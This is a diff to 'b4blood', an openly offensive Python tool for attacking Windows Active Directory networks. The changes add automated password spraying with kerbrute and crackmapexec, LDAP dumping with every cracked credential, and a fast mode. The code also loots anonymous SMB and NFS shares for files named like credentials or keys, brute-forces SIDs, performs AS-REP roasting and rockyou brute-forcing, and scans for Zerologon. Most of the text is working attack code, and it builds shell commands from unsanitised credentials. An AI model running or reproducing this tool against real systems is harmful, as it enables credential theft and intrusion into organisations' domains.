@@ -31,13 +31,14 @@ def parse_arg():
 	parser = argparse.ArgumentParser(description="b4blood --ip 192.168.0.40, b4blood --ip 192.168.0.0/24, b4blood --internal -i eth0")
 	parser.add_argument("--ip", help="Provide an IP or a range, 192.168.0.23, 192.168.8.*, 192.168.7.0/24")
 	parser.add_argument("--internal", action="store_true", help="DHCP broadcast resquest, you must be physicaly on the network.")
-	parser.add_argument("--nsd", action="store_true", help="no smb dump for saving time.")
+	parser.add_argument("--fast", action="store_true", help="no vuln scan, no anonymous smb dump for saving time.")
+	parser.add_argument("--nsd", action="store_true", help="no smb dump with creds for saving time.")
 	parser.add_argument("-U", help="Provide your own userlist to Kerbrute users. Default xato-net-10-million-usernames. b4blood --ip 192.168.0.8 -U users.txt")
 	parser.add_argument("-P", help="Provide your own passlist to Kerbrute users. Default rockyou.txt. b4blood --ip 192.168.0.8 -P pass.txt, b4blood --ip 192.168.0.8 -U users.txt -P pass.txt")
 	parser.add_argument("-i", help="Interface for internal scan")
 	args = parser.parse_args()	
 	#print(args) 
-	return args.ip, args.internal, args.U, args.P, args.i, args.nsd
+	return args.ip, args.internal, args.U, args.P, args.i, args.fast, args.nsd
 
 def asrepHashCredExtract(hash):
     hash=hash.replace("\n","")
@@ -54,37 +55,29 @@ def kerbrute_bruteuser_cred_extract(ker):
 def dumpLdapDB(cont, ip_to_scan, domain_name):
 	print("")
 	printf(" Dumping LDAP",green)
-	if len(cont) > 1:
-		for i, item in enumerate(cont):
-			print(i+1, item.replace("\n",""))
+	for cred in cont:
+		user=cred.split(":")[0]
+		passw=cred.split(":")[1].replace("\n","")
+		printf(f" Dumping AD with {user}:{passw} --> ldap_from_{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt --fast",green)
+		os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
+		os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{domain_name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	
 
-		a=input(blue+f"Choose a cred: from 1 to {len(cont)}: "+white)
-		cred=cont[int(a)-1].replace("\n","")				
-	else:
-		cred=cont[0]
-
-	user=cred.split(":")[0]
-	passw=cred.split(":")[1].replace("\n","")
-	printf(f" Dumping AD with {user}:{passw} --> ldap_from{user}/	"+yellow+f"You should run after the complete scan: b4blood --ip {ip_to_scan} -U users_from_{user}.txt",green)
-	os.system(f'if [ ! -d "ldapdump_from_{user}" ];then mkdir ldapdump_from_{user}; fi')
-	os.system(f'cd ldapdump_from_{user}; ldapdomaindump -u "{domain_name}\\{user}" -p {passw} {ip_to_scan} 2>/dev/null; cd ..')	
-
-	if os.path.isfile(f'ldapdump_from_{user}/domain_users.grep'):
-		dumpDB=1
-		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3 | grep -v name > users_from_{user}.txt')
-		os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3,12 | grep -v name > users_from_{user}_description.txt')
-		print()
-		printf(" Could be interesting",green)
-		with open(f'users_from_{user}_description.txt','r') as fichier:
-			contenu=fichier.readlines()
-		
-		for item in contenu:
-			item=item.split()
-			if len(item) >1:
-				print(white+f'{item[0]:<20}'+ yellow+" ".join(item).replace(item[0],""))
-		print(white)
-	else:
-		printf(" LDAP dumping failed!",red)
+		if os.path.isfile(f'ldapdump_from_{user}/domain_users.grep'):
+			dumpDB=1
+			os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3 | grep -v name > users_from_{user}.txt')
+			os.system(f'cat ldapdump_from_{user}/domain_users.grep | cut -f3,12 | grep -v name > users_from_{user}_description.txt')
+			print()
+			printf(" Could be interesting",green)
+			with open(f'users_from_{user}_description.txt','r') as fichier:
+				contenu=fichier.readlines()
+			
+			for item in contenu:
+				item=item.split()
+				if len(item) >1:
+					print(white+f'{item[0]:<20}'+ yellow+" ".join(item).replace(item[0],""))
+			print(white)
+		else:
+			printf(" LDAP dumping failed!",red)
 
 
 banner ="""
@@ -100,7 +93,7 @@ print("https://github.com/moloch54/b4blood")
 print("2023 by Moloch\n")
 print()
 
-ip,internal,U,P,interface, nsd = parse_arg()
+ip,internal,U,P,interface, fast, nsd = parse_arg()
 ip_to_scan = ip
 
 if ip_to_scan == None and internal==False:
@@ -344,73 +337,74 @@ for item in contenu_nmap:
 	if "88/tcp" in item:
 		krb=1
 
-if smb==1:
-		printf(" scanning SMB vulns ",green)
-		os.system(f"nmap {ip_to_scan}  -Pn --script vuln -p 445 -v | grep 'VULNERABLE:' -C 1 > smb_vuln.txt")
-		with open("smb_vuln.txt","r") as fichier:
-			cont=fichier.readlines()
-		if len(cont)>1:
-			for it in cont:
-				print(yellow+it.replace("\n","")+white)
-			print()
-		else:
-			os.system("rm smb_vuln.txt")
-		
-		# scan anonymous shares
-		if not nsd:
-			os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
-			os.system('if [ ! -d "shares" ];then mkdir shares; fi')
-			printf(' scanning for anonymous smb shares  --> /smb_dump',green)
-			os.system(f"smbmap -H {ip_to_scan} -u ' ' -p ' ' | grep -v Working | tee shares/anonymous_shares.txt")
-			with open("shares/anonymous_shares.txt","r") as fic:
-				co=fic.readlines()
-			if len(co)<2:
-				print("via smbclient")
-				os.system(f"smbclient -L {ip_to_scan} -N | tee shares/anonymous_shares.txt")
+if smb and not fast:
+	printf(" scanning SMB vulns ",green)
+	os.system(f"nmap {ip_to_scan}  -Pn --script vuln -p 445 -v | grep 'VULNERABLE:' -C 1 > smb_vuln.txt")
+	with open("smb_vuln.txt","r") as fichier:
+		cont=fichier.readlines()
+	if len(cont)>1:
+		for it in cont:
+			print(yellow+it.replace("\n","")+white)
+		print()
+	else:
+		os.system("rm smb_vuln.txt")
+	
+	# scan anonymous shares
+	if not fast:
+		os.system('if [ ! -d "smb_dump" ];then mkdir smb_dump; fi')
+		os.system('if [ ! -d "shares" ];then mkdir shares; fi')
+		printf(' scanning for anonymous smb shares  --> /smb_dump',green)
+		os.system(f"smbmap -H {ip_to_scan} -u ' ' -p ' ' | grep -v Working | tee shares/anonymous_shares.txt")
+		with open("shares/anonymous_shares.txt","r") as fic:
+			co=fic.readlines()
+		if len(co)<2:
+			print("via smbclient")
+			os.system(f"smbclient -L {ip_to_scan} -N | tee shares/anonymous_shares.txt")
 
-			with open("shares/anonymous_shares.txt","r") as fic:
-				co=fic.readlines()
+		with open("shares/anonymous_shares.txt","r") as fic:
+			co=fic.readlines()
 
-			if len(co) >1:
+		if len(co) >1:
 
-				# anonymous creds
-				# on dump all ici!
-				print("")
-				os.system("cat shares/anonymous_shares.txt | grep 'READ\|Disk' | awk '{print $1}' > shares/shares_.txt")
-				with open("shares/shares_.txt","r") as fichier3:
-					shares=fichier3.readlines()
-				os.chdir("./smb_dump")
-				file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
-				for share in shares:
-					share=share.replace("\n","")
-					share=share.replace(" ","")
+			# anonymous creds
+			# on dump all ici!
+			print("")
+			os.system("cat shares/anonymous_shares.txt | grep 'READ\|Disk' | awk '{print $1}' > shares/shares_.txt")
+			with open("shares/shares_.txt","r") as fichier3:
+				shares=fichier3.readlines()
+			os.chdir("./smb_dump")
+			file_content="account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xlsx,doc,id,txt,zip".split(",")
+			for share in shares:
+				share=share.replace("\n","")
+				share=share.replace(" ","")
 
-					# on récupère les directories récursivement		
-					cmd=f"smbclient //{ip_to_scan}/{share} -N -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
-					print(blue+f"Dumping {share}	Could take a while..."+white)
-					os.system(cmd)
-					
-					# scan /
-					cmd=f"recurse on; prompt off;"
-					for fc in file_content:	
+				# on récupère les directories récursivement		
+				cmd=f"smbclient //{ip_to_scan}/{share} -N -c 'recurse on;ls' | grep -E '^\\"+"\\"+"'" + "| awk '{print $1}' "+f" > ../shares/all_folders_{share}.txt"
+				print(blue+f"Dumping {share}	Could take a while..."+white)
+				os.system(cmd)
+				
+				# scan /
+				cmd=f"recurse on; prompt off;"
+				for fc in file_content:	
+					cmd+=f"mget *{fc}*;"
+
+				os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
+
+				with open(f"../shares/all_folders_{share}.txt","r") as fshare:
+					contenu_fshare=fshare.readlines()
+
+				for folders in contenu_fshare:
+					folders=folders.replace("\n","")	
+					cmd=f"recurse on; prompt off;cd {folders};"
+					for fc in file_content:
 						cmd+=f"mget *{fc}*;"
-
 					os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
 
-					with open(f"../shares/all_folders_{share}.txt","r") as fshare:
-						contenu_fshare=fshare.readlines()
+			os.chdir("../")
+		print()
 
-					for folders in contenu_fshare:
-						folders=folders.replace("\n","")	
-						cmd=f"recurse on; prompt off;cd {folders};"
-						for fc in file_content:
-							cmd+=f"mget *{fc}*;"
-						os.system(f'smbclient //{ip_to_scan}/{share} -N -c "{cmd}">/dev/null')
-
-				os.chdir("../")
-			print()
-
-		if os.path.isdir("smb_dump"):
+	if os.path.isdir("smb_dump"):
+		if len(os.listdir('smb_dump')) != 0:
 			printf(" could be interesting in ./smb_dump",green)
 			for filename in os.listdir("./smb_dump"):
 				print(yellow+filename+white)
@@ -423,12 +417,9 @@ if ldap and U ==None:
 	for item in a:
 		b=b+"DC="+f"{item}"+","
 	b=b[:-1]
-	os.system(f"ldapsearch -LLL -x -H ldap://{ip_to_scan} -b '{b}' 2>/dev/null | grep sn | cut -d' ' -f2 | tee ldapnull_users.txt")
-	with open("ldapnull_users.txt","r") as fichier:
-		contenu=fichier.readlines()
-	if len(contenu) ==0:
-		#os.system("rm ldapnull_users.txt")
-		printf(" no LDAP found",red)
+	os.system(f"ldapsearch -LLL -x -H ldap://{ip_to_scan} -b '{b}' > ldapnull.txt")
+	os.system("cat ldapnull.txt	| grep -i 'sn:' | cut -d' ' -f2 | tee ldapnull_users.txt")
+	os.system("cat ldapnull.txt | grep -i 'dn: uid\|dn: cn=' | awk '{print $2}' | cut -d ',' -f1 | cut -d '=' -f2")
 
 	printf(" bruteforcing LDAP SID with '' session",green)
 	os.system(f"python3 /opt/impacket/examples/lookupsid.py {domain_name}/''@{ip_to_scan} -no-pass" + " | grep 'SidTypeUser'| cut -d '\\' -f2 | awk '{print $1}'  | tee brutesidnull_users.txt")
@@ -440,6 +431,8 @@ if ldap and U ==None:
 		printf(" no LDAP found with SID '' bruteforce",red)
 
 	printf(" bruteforcing LDAP SID with 'guest' session",green)
+	print(yellow,end="")
+
 	os.system(f"python3 /opt/impacket/examples/lookupsid.py {domain_name}/'guest'@{ip_to_scan} -no-pass" + " | grep 'SidTypeUser'| cut -d '\\' -f2 | awk '{print $1}'  | tee brutesidguest_users.txt")
 
 	with open("brutesidguest_users.txt","r") as fichier:
@@ -464,8 +457,8 @@ if ldap and U ==None:
 			U="guested_users.txt"
 
 
-if nfs:
-	file_content="log,account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xslx,doc,id,txt,zip".split(",")
+if nfs and not fast:
+	file_content="log,account,compte,cred,user,pass,util,backup,note,vbs,ps1,bat,code,conf,cfg,rsa,pem,key,xml,xlsx,doc,id,txt,zip".split(",")
 	printf(" scanning NFS",green)
 	r=random.randrange(1000000)
 	os.system(f"showmount -e {ip_to_scan} > NFS.txt")
@@ -533,6 +526,7 @@ if krb:
 			contenu = fichier.readlines()
 	if  len(contenu) !=0 and contenu[0] !="\n":
 
+
 		# to do check si valid users!
 		printf(' AS-REP Roasting valid users',green)
 		os.system(f'python3 {path_impacket}/GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip {ip_to_scan} {domain_name}/ > GetNPUsers.log' )
@@ -579,52 +573,115 @@ if os.path.isfile(f'valid_users.txt'):
 		contenu=fichier.readlines()
 
 print("")
-if len(contenu) !=0:
-	printf(" Bruteforcing passwords",green)
-	for i,user in enumerate(contenu):
-		print(i+1,user.replace("\n",""))
-	
-	a=input(blue+"Which user to bruteforce? 0=None: "+white)	
-	if a!="0":
-		user=contenu[int(a)-1].replace("\n","")
-		print("")
-		if P ==None:
-			P="/usr/share/wordlists/rockyou.txt"
-		printf(f" Lauching {P} against {user}@{domain_name}",green)
-		os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {domain_name.replace('.local0.','')} {P} {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
+if len(contenu) !=0 and krb and not fast:
+	if not fast:
+		printf(" Bruteforcing passwords",green)
+		for i,user in enumerate(contenu):
+			print(i+1,user.replace("\n",""))
+
+		a=input(blue+"Which user to bruteforce? 0=None: "+white)	
+		if a!="0":
+			user=contenu[int(a)-1].replace("\n","")
+			print("")
+			if P ==None:
+				P="/usr/share/wordlists/rockyou.txt"
+			printf(f" Lauching {P} against {user}@{domain_name}",green)
+			os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {domain_name} {P} {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
+			os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
+			#exit()
+			with open(f"creds_{user}.txt","r") as fichier:
+					contenu=fichier.readlines()
+			if not contenu:
+				print("")
+				printf(" No password cracked",red)
+				#exit()
+			else:
+				print("")
+				with open("all_creds.txt","r+") as fichier2:
+					contenu_all_creds=fichier2.readlines()
+					#print(contenu_all_creds)
+					#print(contenu)
+
+					for item in contenu:
+						cred=kerbrute_bruteuser_cred_extract(item)
+						print(yellow+cred+white+"	(added to all_creds.txt)\n")
+						#print(contenu_all_creds)
+						if (cred+"\n") not in contenu_all_creds:	
+							os.system(f"echo '{cred}' >> all_creds.txt")
+else:
+	printf(" No valid user found!",red)
+
+contenu=[]
+if os.path.isfile(f'valid_users.txt') and krb and not smb:
+	with open("valid_users.txt") as fichier:
+		contenu=fichier.readlines()
+	printf(" trying user as pass (Kerberos) and password spraying",green)
+	with open("all_creds.txt","r") as fi:
+		co=fi.readlines()
+	#print(co)
+	os.system("cp valid_users.txt valid_users_and_pass.txt")
+	for p in co:
+		if p !=("\n"):
+			p=p.replace("\n","")
+			os.system(f"echo {p.split(':')[1]} >> valid_users_and_pass.txt")
+	#print(contenu)
+	for user in contenu:
+		user=user.replace("\n","")
+		#print(user)
+		os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {domain_name} valid_users_and_pass.txt {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
 		os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
 		#exit()
 		with open(f"creds_{user}.txt","r") as fichier:
-				contenu=fichier.readlines()
-		if not contenu:
-			print("")
-			printf(" No password cracked",red)
-			#exit()
-		else:
-			print("")
+				contenu2=fichier.readlines()
+		if  len(contenu2) !=0:
+			#print("")
 			with open("all_creds.txt","r+") as fichier2:
 				contenu_all_creds=fichier2.readlines()
 				#print(contenu_all_creds)
 				#print(contenu)
 
-				for item in contenu:
+				for item in contenu2:
 					cred=kerbrute_bruteuser_cred_extract(item)
-					print(yellow+cred+white+"	(added to all_creds.txt)\n")
+					print(yellow+cred+white+"	(added to all_creds.txt)")
 					#print(contenu_all_creds)
 					if (cred+"\n") not in contenu_all_creds:	
 						os.system(f"echo '{cred}' >> all_creds.txt")
-else:
-	printf(" No valid user found!",red)
 
 contenu=[]
 if os.path.isfile(f'all_creds.txt'):
 	with open("all_creds.txt","r") as fichier:
 		contenu=fichier.readlines()
 
-if ldap:
+if len(contenu) !=0 and smb:
+	printf(" trying user as pass (SMB) and password spraying (could take a while...)",green)
+	with open("all_creds.txt","r") as fi:
+		co=fi.readlines()
+	os.system("cp valid_users.txt valid_users_and_pass.txt")
+	for p in co:
+		if p !=("\n"):
+			p=p.replace("\n","")
+			os.system(f"echo {p.split(':')[1]} >> valid_users_and_pass.txt")
+	os.system(f"crackmapexec smb -u valid_users.txt -p valid_users_and_pass.txt -d {domain_name} {ip_to_scan} --continue-on-success" + " | awk '{print $6, $7}' " + f"| grep {domain_name} > smb_spray.txt")
+	with open("smb_spray.txt") as spray:
+		sp=spray.readlines()
+	for s in sp:
+		s=s.replace("\n","")
+		if s != "" and not "FAILURE" in s:
+			if "STATUS_PASSWORD_MUST_CHANGE" in s:
+				print(s)
+				us=s.replace(domain_name+'\\',"")
+				print(us)
+				us=us[:us.index(":")]
+				print(yellow + s + white+		f"\t--> smbpassw -r {ip_to_scan} -U {us}")
+			else:
+				print(yellow + s + white)
+
+
+if ldap and not nsd:
 	if len(contenu) !=0:
 		dumpLdapDB(contenu, ip_to_scan, domain_name)
-if smb:
+
+if smb and not fast:	
 	printf(" scanning Zerologon vuln 	(about 2mn)",green)
 	#print(CN.split('.')[0])
 	#os.system(f"python cve-2020-1472-exploit.py {CN.split('.')[0]} {ip_to_scan}")
